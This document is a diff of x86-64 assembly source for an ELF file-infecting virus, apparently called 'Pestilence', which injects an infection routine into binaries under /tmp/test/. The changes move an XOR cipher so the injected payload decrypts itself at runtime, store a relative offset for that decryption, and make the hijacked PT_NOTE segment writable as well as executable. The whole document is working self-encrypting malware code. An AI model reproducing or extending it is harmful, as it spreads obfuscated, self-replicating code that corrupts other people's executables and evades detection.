@@ -76,12 +76,47 @@ uncipher:
 	cmp rdi, 0x0					; if (data == 0x0)
 	je .end						; 	goto .end;
 
+	mov rax, rdi					; infection_routine_offset = data
+	lea rdi, [rel begin]				; data = begin
+	add rdi, rax					; data += infection_routine_offset
+
 	mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
 	lea rdx, [rel key]				; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
 
 	.end:
 		ret
+
+; void xor_cipher(char *data, int size, char *key);
+; xor_cipher(rdi data, rsi size, rdx key);
+xor_cipher:
+	push rdx					; save key
+
+	.loop:
+		cmp rsi, 0				; if (size == 0)
+		je .end					; 	goto .end
+
+		mov al, [rdi]				; al = *data
+		mov bl, [rdx]				; bl = *key
+		xor al, bl				; al ^= bl
+		mov [rdi], al				; *data = al
+
+		inc rdi					; data++
+		inc rdx					; key++
+		dec rsi					; size--
+
+		cmp byte [rdx], 0			; if (*key == 0)
+		je .key_reset				; 	goto .key_reset
+
+		jmp .loop				; goto .loop
+
+	.key_reset:
+		mov rdx, [rsp]				; restore key
+		jmp .loop				; goto .loop
+
+	.end:
+		pop rdx					; reset stack
+		ret					; return
 
 ; void infection_routine()
 infection_routine:
@@ -374,7 +409,7 @@ treat_file:
 	mov [rdi], rax					; ...
 
 	; xor cipher all injected bytes between infection_routine and cipher_stop
-	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - _begin);
+	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - begin);
 	add rdi, [filesize]				;
 	add rdi, infection_routine - begin		;
 	mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
@@ -382,13 +417,12 @@ treat_file:
 	call xor_cipher					; xor_cipher(data, size, key)
 
 	; change cipher address in injected code (uncipher)
-	mov rdi, [mappedfile]				; uncipher_ptr = file_map + filesize + (uncipher - _begin);
+	mov eax, infection_routine - begin		; infection_routine_offset = infection_routine - begin;
+	mov rdi, [mappedfile]				; uncipher_ptr = file_map + filesize + (uncipher - begin);
 	add rdi, [filesize]				;
 	add rdi, uncipher - begin			;
 	inc rdi						; 	+ 1;
-	mov rax, [new_vaddr]				; infection_routine_addr = new_vaddr + (infection_routine - _begin);
-	add rax, infection_routine - begin		;
-	mov [rdi], rax					; *uncipher_ptr = infection_routine_addr;
+	mov [rdi], eax					; *uncipher_ptr = infection_routine_offset;
 
 
 .unmap_file:
@@ -679,7 +713,7 @@ convert_pt_note_to_load:
 
 	mov rdi, rax					; _flags_ptr = _note_segment->p_flags;
 	add rdi, elf64_phdr.p_flags			; ...
-	mov DWORD [rdi], PF_X | PF_R | PF_PESTILENCE	; *_flags_ptr = PF_X | PF_R | PF_PESTILENCE;
+	mov DWORD [rdi], PF_X | PF_R | PF_W | PF_PESTILENCE	; *_flags_ptr = PF_X | PF_R | PF_W | PF_PESTILENCE;
 
 	mov rdi, rax					; _offset_ptr = _note_segment->p_offset;
 	add rdi, elf64_phdr.p_offset			; ...
@@ -751,37 +785,6 @@ print_string:
 	add rsp, 8					; unpop '\n'
 
 	ret
-
-; void xor_cipher(char *data, int size, char *key);
-; xor_cipher(rdi data, rsi size, rdx key);
-xor_cipher:
-	push rdx					; save key
-
-	.loop:
-		cmp rsi, 0				; if (size == 0)
-		je .end					; 	goto .end
-
-		mov al, [rdi]				; al = *data
-		mov bl, [rdx]				; bl = *key
-		xor al, bl				; al ^= bl
-		mov [rdi], al				; *data = al
-
-		inc rdi					; data++
-		inc rdx					; key++
-		dec rsi					; size--
-
-		cmp byte [rdx], 0			; if (*key == 0)
-		je .key_reset				; 	goto .key_reset
-
-		jmp .loop				; goto .loop
-
-	.key_reset:
-		mov rdx, [rsp]				; restore key
-		jmp .loop				; goto .loop
-
-	.end:
-		pop rdx					; reset stack
-		ret					; return
 
 section .data
 	infected_folder_1: db "/tmp/test/", 0
